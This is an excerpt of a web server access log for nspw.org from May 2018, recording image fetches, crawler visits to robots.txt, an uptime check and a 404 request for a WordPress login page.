66.102.6.197 - - [03/May/2018:13:16:19 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.197 - - [03/May/2018:13:16:19 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.199 - - [03/May/2018:13:16:19 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 4206 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.199 - - [03/May/2018:13:16:20 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 4192 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
35.232.100.166 - - [03/May/2018:13:16:38 -0400] "GET /robots.txt HTTP/1.1" 200 4496 "-" "ltx71 - (http://ltx71.com/)"
63.249.66.212 - - [03/May/2018:13:17:04 -0400] "GET /robots.txt HTTP/1.1" 200 5933 "-" "Mozilla/5.0 (compatible; changedetection/7.0; +http://www.changedetection.com/bot.html)"
63.249.66.212 - - [03/May/2018:13:17:04 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (compatible; changedetection/7.0; +http://www.changedetection.com/bot.html)"
2.152.149.73 - - [03/May/2018:13:17:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
2.152.149.73 - - [03/May/2018:13:17:45 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [03/May/2018:13:17:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
